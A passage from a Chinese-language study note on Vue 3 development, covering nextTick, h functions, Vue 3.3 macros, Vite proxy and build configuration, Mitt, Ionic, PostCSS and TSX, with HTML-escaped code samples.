9999999&#125; 实际上nextTick函数就是将其中的代码变为了异步任务，其源码是通过Promise将代码变为微任务实现的： 源码地址：core\\packages\\runtime-core\\src\\scheduler.ts 12345678910const resolvedPromise: Promise&lt;any&gt; = Promise.resolve()let currentFlushPromise: Promise&lt;void&gt; | null = nullexport function nextTick&lt;T = void&gt;( this: T, // ts语法用于指定this类型 fn?: (this:T) =&gt; void): Promise&lt;void&gt; &#123; const p = currrentFlushPromise || resolvedPromise return fn ? p.then(this ? fn.bind(this), fn) : p&#125; 事实上nextTick中的tick指的就是浏览器渲染过程中的一帧，那浏览器这一帧率做了什么 1.处理用户的事件，就是event 例如 click，input change 等。 2.执行定时器任务 3.执行 requestAnimationFrame 4.执行dom 的回流与重绘 5.计算更新图层的绘制指令 6.绘制指令合并主线程 如果有空余时间会执行 requestidlecallback 所以 一个Tick 就是去做了这些事 h函数 Vue事实上包含三种编写风格： template风格 JSX风格 h函数风格 Vue3中已经很少使用了，偶尔会出现在，需要定义一个小组件单又不需要复用，不想为其创建文件夹的场景下 出现的原因是Vue单文件组件编译是需要过程，他会经过 parser编译为AST树 -&gt; transform转化为JS API -&gt; generate生成render函数 render函数则会返回一个h函数包裹的VNode虚拟DOM节点 而h函数直接跳过这三个阶段，所以性能上有很大的帮助。其底层实际上就是调用的createVNode()方法直接创建虚拟DOM节点，因此实际上使用h函数编写组件就像直接编写虚拟DOM节点。 h函数接收三个参数： type节点类型 propsOrChildren对象，主要用来表示props, attrs, dom props, class, style children子节点 h函数有多种重载形式： 123456789101112131415161718192021222324252627// 除类型之外的所有参数都是可选的h(&#x27;div&#x27;)h(&#x27;div&#x27;, &#123; id: &#x27;foo&#x27; &#125;) //属性和属性都可以在道具中使用//Vue会自动选择正确的分配方式h(&#x27;div&#x27;, &#123; class: &#x27;bar&#x27;, innerHTML: &#x27;hello&#x27; &#125;) // props modifiers such as .prop and .attr can be added// with &#x27;.&#x27; and `^&#x27; prefixes respectivelyh(&#x27;div&#x27;, &#123; &#x27;.name&#x27;: &#x27;some-name&#x27;, &#x27;^width&#x27;: &#x27;100&#x27; &#125;) // class 和 style 可以是对象或者数组h(&#x27;div&#x27;, &#123; class: [foo, &#123; bar &#125;], style: &#123; color: &#x27;red&#x27; &#125; &#125;) // 定义事件需要加on 如 onXxxh(&#x27;div&#x27;, &#123; onClick: () =&gt; &#123;&#125; &#125;) // 子集可以字符串h(&#x27;div&#x27;, &#123; id: &#x27;foo&#x27; &#125;, &#x27;hello&#x27;) //如果没有props是可以省略props 的h(&#x27;div&#x27;, &#x27;hello&#x27;)h(&#x27;div&#x27;, [h(&#x27;span&#x27;, &#x27;hello&#x27;)]) // 子数组可以包含混合的VNode和字符串h(&#x27;div&#x27;, [&#x27;hello&#x27;, h(&#x27;span&#x27;, &#x27;hello&#x27;)]) props传递参数： 12345678910111213141516&lt;template&gt; &lt;Btn text=&quot;按钮&quot;&gt;&lt;/Btn&gt;&lt;/template&gt; &lt;script setup lang=&#x27;ts&#x27;&gt;import &#123; h, &#125; from &#x27;vue&#x27;;type Props = &#123; text: string&#125;const Btn = (props: Props, ctx: any) =&gt; &#123; return h(&#x27;div&#x27;, &#123; class: &#x27;p-2.5 text-white bg-green-500 rounded shadow-lg w-20 text-center inline m-1&#x27;, &#125;, props.text)&#125;&lt;/script&gt; 派发事件： 12345678910111213141516171819202122&lt;template&gt; &lt;Btn @on-click=&quot;getNum&quot; text=&quot;按钮&quot;&gt;&lt;/Btn&gt;&lt;/template&gt; &lt;script setup lang=&#x27;ts&#x27;&gt;import &#123; h, &#125; from &#x27;vue&#x27;;type Props = &#123; text: string&#125;const Btn = (props: Props, ctx: any) =&gt; &#123; return h(&#x27;div&#x27;, &#123; class: &#x27;p-2.5 text-white bg-green-500 rounded shadow-lg w-20 text-center inline m-1&#x27;, onClick: () =&gt; &#123; ctx.emit(&#x27;on-click&#x27;, 123) &#125; &#125;, props.text)&#125; const getNum = (num: number) =&gt; &#123; console.log(num);&#125;&lt;/script&gt; 定义插槽： 1234567891011121314151617181920212223242526&lt;template&gt; &lt;Btn @on-click=&quot;getNum&quot;&gt; &lt;template #default&gt; 按钮slots &lt;/template&gt; &lt;/Btn&gt;&lt;/template&gt; &lt;script setup lang=&#x27;ts&#x27;&gt;import &#123; h, &#125; from &#x27;vue&#x27;;type Props = &#123; text?: string&#125;const Btn = (props: Props, ctx: any) =&gt; &#123; return h(&#x27;div&#x27;, &#123; class: &#x27;p-2.5 text-white bg-green-500 rounded shadow-lg w-20 text-center inline m-1&#x27;, onClick: () =&gt; &#123; ctx.emit(&#x27;on-click&#x27;, 123) &#125; &#125;, ctx.slots.default())&#125; const getNum = (num: number) =&gt; &#123; console.log(num);&#125;&lt;/script&gt; 可以看到实际上和编写setUphan’shu的形式是一样的。 Vue3.3编译宏 需要使用Vue3.3及以上版本 defineProps 使用普通方式defineProps接收组件参数时，无法设置赞数类型，因此使得使用prop访问参数时没有代码提示 为了解决这个问题Vue提供了PropType，可以使用这个API将参数断言为指定的数据类型 同时defineProps函数也可接收一个泛型来定义接收参数的类型：defineProps&lt;&#123;name:string[]&#125;&gt;() Vue3.3对defineProps进行了改进，新增了泛型的支持，需要在script标签上增加generic=&quot;T&quot;熟悉来定义泛型 父向子组件传参 12345678910&lt;template&gt; &lt;div&gt; &lt;Child :name=&quot;[&#x27;ender&#x27;]&quot;&gt;&lt;/Child&gt; &lt;/div&gt;&lt;/template&gt; &lt;script lang=&#x27;ts&#x27; setup&gt; import Child from &#x27;./views/child.vue&#x27;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 子组件接收 123456789101112 &lt;template&gt; &lt;div&gt; &#123;&#123; name &#125;&#125; &lt;/div&gt;&lt;/template&gt; &lt;script generic=&quot;T&quot; lang=&#x27;ts&#x27; setup&gt; // 通过generic属性定义泛型 defineProps&lt;&#123; name:T[] // name属性就可以使用泛型构造任意类型数组的类型 &#125;&gt;()&lt;/script&gt; 这也如果有的父组件要向子组件传递string[]，但有的又需要传递number[]时，就可以使用泛型来定义类型 defineEmits defineEmits编译宏用来进行事件派发，在TS中为了获得更友好的类型提示，通常我们需要利用该函数接收一个泛型来定义事件接收函数的类型： 123const emit = defineEmits&lt;&#123; (event: string, name: string): void&#125;&gt;() 3.3中对这一方式进行了优化，可以直接通过数组的形式为事件指定参数类型： 123const emit = defineEmits&lt;&#123; &#x27;send&#x27;: [name: string]&#125;&gt;() defineOptions vue3.3内置了defineOptions()用于操作OptionsAPI中的内容，需要注意的是已经有编译宏的Options，比如emit，props, expose, slots无法在其中使用 通常用来定义name： 1234defineOptions(&#123; name:&quot;Child&quot;, inheritAttrs:false,&#125;) defineSlots defineSlots是3.3新增的编译宏，只做声明不做实现 作用是约束slot类型 父组件 123456789101112131415161718192021222324&lt;template&gt; &lt;div&gt; &lt;Child :data=&quot;list&quot;&gt; &lt;template #default=&quot;&#123;item&#125;&quot;&gt; &lt;div&gt;&#123;&#123; item.name &#125;&#125;&lt;/div&gt; &lt;/template&gt; &lt;/Child&gt; &lt;/div&gt;&lt;/template&gt;&lt;script lang=&#x27;ts&#x27; setup&gt;import Child from &#x27;./views/child.vue&#x27;const list = [ &#123; name: &quot;张三&quot; &#125;, &#123; name: &quot;李四&quot; &#125;, &#123; name: &quot;王五&quot; &#125;]&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 子组件 123456789101112131415161718&lt;template&gt; &lt;div&gt; &lt;ul&gt; &lt;li v-for=&quot;(item,index) in data&quot;&gt; &lt;slot :index=&quot;index&quot; :item=&quot;item&quot;&gt;&lt;/slot&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/template&gt; &lt;script generic=&quot;T&quot; lang=&#x27;ts&#x27; setup&gt;defineProps&lt;&#123; data: T[]&#125;&gt;()defineSlots&lt;&#123; default(props:&#123;item:T,index:number&#125;):void&#125;&gt;()&lt;/script&gt; 环境变量 Vue提供的用于区分开发环境，测试环境，生产环境的方法 默认的环境变量保存在import.meta.env，需要注意的是尽量不要对环境变量做动态的修改，因为在生成环境中环境变量采用硬编码的方式，因此在生产环境下动态修改环境变量会报错 如果需要自定义环境变量，则需要在根目录下创建文件名为： .env.development-开发环境 .env.production-生产环境 的文件 如果希望上述两个环节变量生效，需要子package.json中是script中指定启动命令的模式（目前可以默认读取无需配置了： 1234&quot;scripts&quot;: &#123; // &quot;dev&quot;: &quot;vite&quot; &quot;dev&quot;: &quot;vite --mode development&quot;&#125; 但如果想在Vue组件以外的ts文件中获取环境变量，比如在vist.config.ts中获取环境变量则需要使用nodejs的API以及Vite的APi： 12345678910import &#123; defineConfig, loadEnv &#125; from &quot;vite&quot;export default(&#123;mode&#125;:any) =&gt; &#123; // loadEnv接收两个参数，第一个参数代表当前允许的模式，此处通过export default的回调函数获得 // 第二个参数接收一个目录代表环境变量文件所在的路径，此处使用nodeJS中的process.cwd()获取根目录路径 console.log(loadEnv(mode, process.cwd())) return defineConfig(&#123; // Vite配置 &#125;)&#125; Vue3性能优化 在开发环境中通常页面性能会使用Chrome浏览器中的LightningHouse进行性能测试 其中包含几个常用指标： FCP First Contentful Paint 首屏加载时间 Speed Index 页面各个可见部分的显示平均时间 当有数据需要从后台获取时将影响这一数值 LCP Largest Contentful Paint 最大内容绘制时间 页面最大的DOM元素绘制所需的时间 TTL Time To Interactive 从页面开始渲染到用户可以操作的时间间隔 即内容必需渲染完成，且交互元素绑定的事件已经注册完成 TBT Total Blocking Time 主进程被阻塞的时间 CLS Cumulative Layout Shift 计算布局偏移值 偏移值不为0可能导致用户想点A但下一帧A按钮被挤到旁边导致实际点了B 而在生产环境中Vite可以使用rollup-plugin-visualizer对打包后的项目进行性能分析 需要在vite.config.ts中进行注册： 12345import &#123; visualizer &#125; from &quot;rollup-plugin-visualizer&quot;defineConfig(&#123; // 主要要将open属性设为true plugins: [Vue(),vueJSX(), visualizer(&#123;open:true&#125;)]&#125;) 然后使用npm run build命令进行打包后，打包完成时会生成一个html显示打包过程中每个模块占用的时间，模块面积越大代表打包耗时越多 对于打包的优化，Vite提供了一些配置项对打包的过程进行优化，可以在build属性中设置： 123456789defineConfig(&#123; build: &#123; chunkSizeWarningLimit: 2000, // 包大小警告阈值 cssCodeSplit: true, // css 拆分 sourcemap: false, // 是否生成sourcemap minify: &quot;terser&quot;, // 是否使用最小化混淆，支持esbuild和terser，前者打包更快，后者打包后体积更小 assetsInlineLimit: 4000 // 小于该值的图片将大包为base64 &#125;&#125;) 此外vite还有许多优化插件，比如： vite-plugin-pwa：让项目支持离线缓存技术，使web应用无线接近于原生应用 可以添加到桌面，使用manifest实现 可以实现离线缓存，使用service worker实现（新技术 可以发送通知，使用service worker实现 另外还可以通过一些vue的插件进行性能优化比如图像懒加载可以使用vue3-lazy实现懒加载 对于数据量很多的列表可以使用虚拟列表中技术（Element-UI已经集成），即只有可视区域的DOM，其余部分没有DOM 对于主进程频繁被阻塞的问题可以使用多线程来解决，通过new Worker创建子线程，然后通过postMessage和onMessage分别进行发送信息和接收信息，使用terminate方法关闭，该方法遵守同源限制，且不允许在子线程中操作DOM 此外还可以使用防抖和节流来优化用户体验，这些在VueUse中都已经实现 Web Components 原生JS也提供了封装组件的能力，由三部分组成： Custom Element：自定义元素 Shadow DOM：（微前端也是基于该技术，隔离JS和CSS）用于将组件的css与js和外部缓解隔离 HTML template：允许我们使用模板字符串定义组件中的HTML内容 Web Components包含四个生命周期： connectedCallback：挂载 disconnectedCallback：断开 adoptedCallback：移动 attributeChangeCallback：改变 原生Web Component也可以配合Vue一起使用 注意：vue中使用原生组件需要在vite配置中指定某某前缀的组件跳过组件检测 然后就可以在js中使用defineCustomElement(customVueCeVue)创建自定义组件，其中函数可以从vue中导入，customVueCeVue为我们定义好的组件 然后使用window.customElements.define('prefix-component')将组件和他的标签挂载道window对象上 这种模式下传参时只能支持字符串参数，因此如果要传递引用类型则需要使用JSON.stringify()转化为JSON字符串 proxy跨域 跨域是存在于浏览器端的问题，主要是由于浏览器最核心最基础的安全功能——同源策略限制 当一个请求url的协议，域名，端口三者中任意一个与当前页面的URL不同则为跨域 解决跨域问题通常有以下几个方法 JsonP方法 百度使用的方法 原理：由于HTML中的script标签不受同源策略的限制，因此我们可以通过动态创建script标签，将src作为服务器地址，然后服务器返回一个callback接受返回的参数。 12345678910111213function clickBtn() &#123; let s, obj obj = &#123;&quot;table&quot;: &quot;products&quot;, &quot;limit&quot;: 10&#125;; // 构建参数 s = document.createElement(&quot;script&quot;); // 创建script元素 s.src = &quot;接口地址xxxxx&quot; + JSON.stringify(obj) // 传递参数 document.body.appendChild(s) // 将script挂载&#125;// 与服务端返回函数同名function myFunc(myObj) &#123; // 接收后端返回数据 document.getElementById(&quot;demo&quot;).innerHTML = myObj&#125; 但该方法无法发送post请求 CORS设置 后端可以通过设置CORS来允许跨域资源共享 12345678&#123; &quot;Access-Control-Allow-Origin&quot;: &quot;http://web.xxx.com&quot; // 可指定地址&#125;// 也可以设为*允许任意站点&#123; &quot;Access-Control-Allow-Origin&quot;: &quot;*&quot; // 使用通配符允许任意站点访问，不推荐，安全性不高，且在使用session时无法在前端种植cookie&#125; Proxy代理 实际上是用node代替前端对后端进行请求（因为服务端没有跨域限制） 假设有后端接口： 123456789101112const express = require(&#x27;express&#x27;)const app = express()//创建get请求app.get(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.json(&#123; code:200, message:&quot;请求成功&quot; &#125;)&#125;)//端口号9001app.listen(9001) 我们直接在前端使用fetch会报跨域错误： 1234&lt;script lang=&quot;ts&quot; setup&gt;import &#123;ref,reactive &#125; from &#x27;vue&#x27;fetch(&#x27;http://localhost:9001/user&#x27;)&lt;/script&gt; 此时可以开启vite的代理 vite中在配置文件中设置： 12345678910111213// vite.config.tsexport default defineConfig(&#123; plugins: [vue()], server:&#123; proxy:&#123; &#x27;/api&#x27;:&#123; target:&quot;http://localhost:9001/&quot;, //跨域地址 changeOrigin:true, //支持跨域 rewrite:(path) =&gt; path.replace(/^\\/api/, &quot;&quot;)//重写路径,替换/api &#125; &#125; &#125;&#125;) 然后将前端请求url修改为/api/user即可 webpack proxy 和 node proxy 用法都类似 需要注意的是proxy只在开发环境中生效，生产环境由于网页会上服务器，前后端分离可以使用nginx，apache等等服务器的代理实现 vite的proxy底层实现实际上就是监听前端页面端口的请求后，向服务器端口发送请求： 1234567891011121314151617181920212223242526// proxyMiddleware 中的代码import httpProxy from &#x27;http-proxy&#x27;export function proxyMiddleware( httpServer: http.Server | null, options: NonNullable&lt;CommonServerOptions[&#x27;proxy&#x27;]&gt;, config: ResolvedConfig ): Connect.NextHandleFunction &#123; // lazy require only when proxy is usedconst proxy = httpProxy.createProxyServer(opts) as HttpProxy.Server// http-proxy 模块用于转发 http 请求// 其实现的大致原理为使用 http 或 https 模块搭建 node 代理服务器，将客户端发送的请求数据转发到目标服务器，再将响应输送到客户端const http = require(&#x27;http&#x27;)const httpProxy = require(&#x27;http-proxy&#x27;)const proxy = httpProxy.createProxyServer(&#123;&#125;)//创建一个代理服务 代理到9001http.createServer((req,res)=&gt;&#123; proxy.web(req,res,&#123; target:&quot;http://localhost:9001/xm&quot;, //代理的地址 changeOrigin:true, //是否有跨域 ws:true //webSocetk &#125;)&#125;).listen(8888) 虚拟DOM与diff算法 虚拟DOM即通过JS生成的AST节点树 虚拟DOM的产生是因为： 直接操作DOM性能低下 但操作JS速度更快 而Diff算法则是为了让对虚拟DOM的操作变得更快而产生的。 例如v-for中不使用key属性时，更新DOM需要经过以下几个阶段： 按从左到右的顺序，新元素替换旧元素 最后如果元素少了，则卸载最后几个 如果元素多了，则新增最后几个 如果使用了key，更新DOM就变为了如下几个步骤： 前序对比算法（从左到右对比新旧元素的key和type，直到第一个不匹配 后序对比算法（从右到左对比新旧元素的key和type，直到第一个不匹配 如果多出新节点，则挂载 如果多出旧节点，则卸载 乱序情况特殊处理 乱序时，先计算得到key与index的映射 然后应用了贪心+二分查找的思想计算最长上升子序列 那么之后只需要将不在最长上升子序列中的元素进行移动即可 如果在其中就不需要移动，这样能够保证移动的次数最少 Tailwind CSS Tailwind CSS是一个由JS编写的CSS框架，基于PostCSS解析。 PostCSS插件在使用时需要进行一些配置： PostCSS配置文件postcss.config.js，新增tailwind插件 TailwindCSS配置文件tailwind.config.js PostCSS处理CSS的大致流程如下： 将CSS解析为抽象语法树（AST树） 读取配置文件，根据该文件生成新的抽象语法树 将AST树“传递”给一系列数据转换操作处理（变量数据循环生成，嵌套类名循环等） 清除一系列操作留下的数据 将处理完毕的AST树重新转化为字符串 安装 1npm install -D tailwindcss@latest postcss@latest autoprefixer@latest 其中autoprefixer可以 自动为样式添加–web-kit-等等前缀以增强页面的兼容性 生成配置文件 1npx tailwindcss init -p 修改配置文件 12345678910111213141516// 2.0module.exports = &#123; purge: [&#x27;./index.html&#x27;, &#x27;./src/**/*.&#123;vue,js,ts,jsx,tsx&#125;&#x27;], theme: &#123; extend: &#123;&#125;, &#125;, plugins: [],&#125;// 3.0module.exports = &#123; content: [&#x27;./index.html&#x27;, &#x27;./src/**/*.&#123;vue,js,ts,jsx,tsx&#125;&#x27;], theme: &#123; extend: &#123;&#125;, &#125;, plugins: [],&#125; 打包时会根据tailwind的配置，将没有使用到的类排除，只将使用到的类打包 创建一个index.css 引入 123@tailwind base;@tailwind components;@tailwind utilities; 在main.ts中引入样式文件 1import &#x27;./index.css&#x27; Mitt Mitt是一个利用发布订阅设计模式解决组件间通讯操作发杂问题的JS库，它提供了emit，on，off，all四种方法 配置 全局使用Mitt首先需要将其挂载到根组件上，如果使用ts并且想要类型推断功能，则需要获取Mitt中的所有类型： 在项目的main.ts中进行如下配置 1234567891011121314151617181920import &#123; createApp &#125; from &#x27;vue&#x27;import mitt from &#x27;mitt&#x27;import &#x27;./style.css&#x27;import App from &#x27;./App.vue&#x27;const Mitt = mitt()const app = createApp(App)//TODO: 支持TS的类型推断代码提示declare module &#x27;vue&#x27; &#123; export interface ComponentCustomProperties &#123; $Bus: typeof Mitt &#125;&#125;// TODO: 全局挂载Mittapp.config.globalProperties.$Bus = Mittapp.mount(&#x27;#app&#x27;) emit 接着在组件A中就可以直接注册事件： 1234567891011121314151617181920212223&lt;script setup lang=&quot;ts&quot;&gt;import &#123; getCurrentInstance &#125; from &#x27;vue&#x27;;// TODO: 获取组件实例const instance = getCurrentInstance()const emitEvent = () =&gt; &#123; // TODO: 从实例的代理处获得Bus instance?.proxy?.$Bus.emit(&#x27;trans-data-to-b&#x27;, &#x27;来自A的数据&#x27;)&#125;&lt;/script&gt;&lt;template&gt; &lt;div&gt; &lt;h1&gt;组件A&lt;/h1&gt; &lt;button @click=&quot;emitEvent&quot;&gt;emit&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;style&gt;&lt;/style&gt; on 在组件B中可以通过on来订阅事件： 123456789101112131415161718192021222324&lt;script setup lang=&quot;ts&quot;&gt;import &#123; getCurrentInstance, ref &#125; from &#x27;vue&#x27;;const instance = getCurrentInstance()const messageFromA = ref(&quot;&quot;)instance?.proxy?.$Bus.on(&#x27;trans-data-to-b&#x27;, (message: string) =&gt; &#123; console.log(message) messageFromA.value = message&#125;)&lt;/script&gt;&lt;template&gt; &lt;div&gt; &lt;h1&gt;组件B&lt;/h1&gt; &lt;span&gt;&#123;&#123; messageFromA &#125;&#125;&lt;/span&gt; &lt;/div&gt;&lt;/template&gt;&lt;style&gt;&lt;/style&gt; on函数还可以监听所有事件： 123456instance?.proxy?.$Bus.on(&#x27;*&#x27;, (eventName:string,message: string) =&gt; &#123; // 事件名与参数 console.log(eventName) console.log(message) messageFromA.value = message&#125;) Off 使用off函数可以将之前为事件名称绑定的函数删除： 123456789101112131415161718192021222324252627282930&lt;script setup lang=&quot;ts&quot;&gt;import &#123; getCurrentInstance, ref &#125; from &#x27;vue&#x27;;const instance = getCurrentInstance()const messageFromA = ref(&quot;&quot;)const Bus = (message: any) =&gt; &#123; console.log(message) messageFromA.value = message&#125;// TODO: 为事件名绑定事件函数instance?.proxy?.$Bus.on(&#x27;trans-data-to-b&#x27;, Bus)// TODO: 删除事件函数instance?.proxy?.$Bus.off(&#x27;trans-data-to-b&#x27;, Bus)&lt;/script&gt;&lt;template&gt; &lt;div&gt; &lt;h1&gt;组件B&lt;/h1&gt; &lt;span&gt;&#123;&#123; messageFromA &#125;&#125;&lt;/span&gt; &lt;/div&gt;&lt;/template&gt;&lt;style&gt;&lt;/style&gt; all all用来获取一个所有事件名称到事件处理函数的Map 可以使用all.clear来清除所有事件的绑定： 1instance?.proxy?.$Bus.all.clear() Ionic ionic是一个支持Angular，react，vue的移动端开发框架，其转化的方式时基于webview的，属于Hybrid App开发，底层时基于cordva和capacitor（二选一） 安装 Java环境以及Android Studio（包含安卓SDK） 项目创建 可以使用以下命令使用ionic命令构建项目： 1ionic start projectName templateName --type vue 接下来可以直接使用npm run dev命令在web端预览项目 安卓预览 如果想在安卓端预览项目，那么首先要对项目打包： 1npm run build 接下来使用ionic命令将包编译为安卓项目 如果是ios项目则只需要把android替换为ios 1ionic capacitor copy android 编译完成后会生成一个android文件夹，其中应该包含一个capacitor.setting.gradle文件 接下来可以使用ionic相关命令开启预览 1ionic capacitor open android ionic会帮忙在android studio中打开项目，创建虚拟机后运行即可预览 但这样的预览无法实现热更新 热更新 ionic热更新只能在使用USB调试的时候可以实现，在安卓SDK中安装USB Driver后，连接安卓手机，使用如下命令开启热更新： 1ionic capacitor run android -l --external H5适配 分辨率适配 在开发移动端页面时常因为设备宽高比不同导致页面显示不全，才是可以通过meta标签来告诉浏览器使用什么大小渲染页面（默认为标准视口大小） 1&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;, initial-scale=&quot;1.0&quot;&gt; 将标签添加在index.html既可 清除默认样式 web页面偶尔会带有默认的margin或padding，会影响开发次数需要清除默认样式，并将根容器进行BFC设置 12345678html,body,#app &#123; height: 100%; overflow: hidden;&#125;* &#123; padding: 0; margin: 0;&#125; postCSS postCSS相当于CSS的babel，可以对CSS代码进行一些预编译。 比如如果想要实现px自动转vw的小工具，只需要编写一个postCSS的小插件即可 在根目录下创建plugins目录 为tsconfig.node.json中的include配置扫包目录，以及开启允许隐式Any的设置 12345678&#123; &quot;compilerOptions&quot;: &#123; &quot;noImplicitAny&quot;: false &#125;, &quot;include&quot;: [ &quot;plugins/**/*&quot;, ]&#125; 在plugin目录下创建插件文件：postcss-px-to-viewport.ts 1234567891011121314151617181920212223242526272829import &#123; Plugin &#125; from &quot;postcss&quot;;// 默认参数const Options = &#123; viewportWidth: 375,&#125;interface Options &#123; viewportWidth?: number&#125;export const PostCsspxToViewport = (options: Options = Options): Plugin =&gt; &#123; // 接收到参数后将参数与默认值合并 const opt = Object.assign(&#123;&#125;, Options, options) return &#123; // 定义插件名称 postcssPlugin: &quot;postcss-px-to-viewport&quot;, // 钩子函数 // 该钩子函数用于获取css节点 Declaration(node) &#123; // 删选带px单位的属性值，node.key和node.value分别表示所有属性与其值 // 这里还可以使用自定义单位，例如ED if(node.value.includes(&quot;px&quot;))&#123; const num = parseFloat(node.value) // 获取属性值的数值部分 node.value = `$&#123;((num / opt.viewportWidth) * 100).toFixed(2)&#125;vw` &#125; &#125; &#125;&#125; 然后再vite.config.ts中引入并注册 123456789101112131415import &#123;PostCsspxToViewport&#125; from &quot;./plugins/postcss-px-to-viewport&quot;// https://vitejs.dev/config/export default defineConfig(&#123; plugins: [ ], // 配置postcss css: &#123; postcss: &#123; plugins: [PostCsspxToViewport()] &#125; &#125;&#125;) 切换主题/切换字体大小 可以使用VueUse插件封装好的APIuseCssVar改变css中定义的变量来实现： 12const font = useCssVar(&#x27;--size&#x27;)font.value = num + &#x27;px&#x27; 其底层原理是通过以下两个API获取和设置css变量： 12document.documentElement.style.getPropertyValue(&#x27;--size&#x27;)document.documentElement.style.setProperty(&#x27;--size&#x27;, num + &#x27;px&#x27;) CSS原子化 定义： 原子化CSS是一种CSS架构方式，其支持小型、单一用途的类，其名称基于视觉功能。 更加通俗的来讲，原子化CSS是一种新的CSS编程思路，它倾向于创建小巧且单一用途的class，并且以视觉效果进行命名。举个简单的例子： 123456789&lt;!-- 原子化类定义 --&gt;&lt;style&gt; .text-white &#123; color: white; &#125; .bg-black &#123; background-color: black; &#125; .text-center &#123; text-align: center; &#125;&lt;/style&gt;&lt;!-- 原子化类使用 --&gt;&lt;div class=&quot;text-white bg-black text-center&quot;&gt;hello Atomic CSS&lt;/div&gt; css原子化的优缺点： 优点： 减少了css体积，提高css可复用性 减少起名复杂度 缺点 增加了记忆成本，比如background需要记住其缩写bg 原子化插件unocss 1npm i -D unocss unocss最好使用在vite中，因为webpack的版本功能被阉割 小满Vue3第三十七章（unocss原子化）_unocss解决了什么问题-CSDN博客 TSX/JSX Vue中同样支持使用JSX的方式来编写组件，需要安装和使用官方插件： 1npm install @vitejs/plugin-vue-jsx -D 安装完成后需要在vite中进行一些配置： 123456789101112131415// vite.config.tsimport &#123; defineConfig &#125; from &#x27;vite&#x27;import vue from &#x27;@vitejs/plugin-vue&#x27;import vueJsx from &#x27;@vite/plugin-vue-jsx&#x27;// https://vitejs.dev/config/export default defineConfig(&#123; plugins: [vue(), vueJsx()], resolve: &#123; alias: &#123; &#x27;@&#x27;: fileURLToPath(new URL(&quot;./src&quot;, import.meta.url)) &#125; &#125;&#125;) TSX的使用 使用TSX创建组件时，先新建一个.tsx文件后，使用如下方式即可： export default function() &#123; return (&lt;div&gt;Ender&lt;/div&gt;) &#125; &lt;!--code￼130--&gt; - 利用`defineComponent`方法创建OptionAPI式组件，需要实现render方法 import &#123; defineComponent &#125; from &quot;vue&quot;; import &#123; ref &#125; from &quot;vue&quot;; interface Props &#123; name?: string &#125; export default defineComponent(&#123; props: &#123; name:String &#125;, emits: [&#x27;my-click&#x27;], setup(props:Props, &#123;emit&#125; ) &#123; const age = ref(25) const fn = (str:string) =&gt; &#123; console.log(&quot;点击了: &quot;, str) emit(&quot;my-click&quot;, str) &#125; console.log(props) return () =&gt; ( &lt;&gt; &lt;div&gt;props: &#123;props.name&#125;&lt;/div&gt; &lt;div onClick=&#123;() =&gt; fn(&quot;Hello&quot;)&#125;&gt; &#123; age.value &#125; &lt;/div&gt; &lt;/&gt; ) &#125; &#125;) &lt;!--code￼131--&gt; unplugin-auto-import 一个能够使项目全局引入vue函数的组件，可以引入ref、reactive等vue包中的函数，也支持axios等其他包 安装： 1npm install unplugin-auto-import 在vite.config.ts中配置： 12345678910111213141516171819202122import &#123; defineConfig &#125; from &#x27;vite&#x27;import &#123; fileURLToPath, URL &#125; from &#x27;node:url&#x27;import vue from &#x27;@vitejs/plugin-vue&#x27;import vueJsx from &#x27;@vitejs/plugin-vue-jsx&#x27;// 自动引入ref, reactive等插件import AutoImport from &#x27;unplugin-auto-import/vite&#x27;// import tsx from &#x27;./plugin/index&#x27;// https://vitejs.dev/config/export default defineConfig(&#123; plugins: [vue(), vueJsx(), AutoImport(&#123; // 全局引入vue包中的函数 imports:[&#x27;vue&#x27;], // 定义挂载位置 dts: &quot;src/auto-import.d.ts&quot; &#125;)], resolve: &#123; alias: &#123; &#x27;@&#x27;: fileURLToPath(new URL(&quot;./src&quot;, import.meta.url)) &#125; &#125;&#125;) Babel与Vite插件编写 一个将ES6+语法编译为ES5从而实现低版本浏览器适配的插件，其原理是： 源代码 -&gt;（编译器（parse））抽象语法树 AST-&gt;（转换过程（transform））修改后的AST -&gt;（生成器（generator））转换后的代码 可以利用Babel实现Vite项目中的TSX解析，可以利用以下插件实现： 12345npm install @vue/babel-plugin-jsx # vue的babel支持npm install @babel/core # babel核心组件npm install @babel/plugin-transform-typescript # babel TS编译器npm install @babel/plugin-syntax-import-meta # import 语法编译npm install @types/babel__core # babel core声明文件 首先我们在根目录下创建一个插件目录plugin并在目录下创建文件index.tx: 12345678910111213141516171819// plugin/index.tsimport type &#123; Plugin &#125; from &#x27;vite&#x27;import * as babel from &#x27;@babel/core&#x27;import jsx from &#x27;@vue/babel-plugin-jsx&#x27;export default function():Plugin &#123; return &#123; // 插件命名需要以vite-plugin开头，vue用来区分是vue使用还是react name: &quot;vite-plugin-vue-tsx&quot;, // id为文件路径 transform(code, id) &#123; // 如果是以.tex结尾的路径 if(/.tsx$/.test(id)) &#123; console.log(code, id) &#125; &#125; &#125;&#125; 其次将该目录添加进tsconfig.node.json文件中进行引入 12345678910&#123; &quot;compilerOptions&quot;: &#123; &quot;composite&quot;: true, &quot;module&quot;: &quot;ESNext&quot;, &quot;moduleResolution&quot;: &quot;Node&quot;, &quot;allowSyntheticDefaultImports&quot;: true &#125;, // 添加plugin目录 &quot;include&quot;: [&quot;vite.config.ts&quot;, &quot;plugin&quot;]&#125; 然后就可以和其他插件一样在vite的配置文件中使用了： 123456789101112131415161718import &#123; defineConfig &#125; from &#x27;vite&#x27;import &#123; fileURLToPath, URL &#125; from &#x27;node:url&#x27;import vue from &#x27;@vitejs/plugin-vue&#x27;// import vueJsx from &#x27;@vitejs/plugin-vue-jsx&#x27;// 自定义插件import tsx from &#x27;./plugin/index&#x27;// https://vitejs.dev/config/export default defineConfig(&#123; // 插件使用 plugins: [vue(), tsx()], resolve: &#123; alias: &#123; &#x27;@&#x27;: fileURLToPath(new URL(&quot;./src&quot;, import.meta.url)) &#125; &#125;&#125;) Vite Vite提现了Vue团队的一贯作风：减少开发者的心智负担。 相比于webpack，他内置了更多功能从而减少了开发者对插件等外部依赖的管理，降低了心智负担 例如在Vite中不需要配置css-loader、less-loader、ts-loader等等插件就能直接使用。 构建工具 构架工具具备的功能： 遇到ts文件使用tsc将ts文件转化为js文件 遇到.vue或.tsx/jsx使用react-compiler和vue-compiler将其转化为render函数 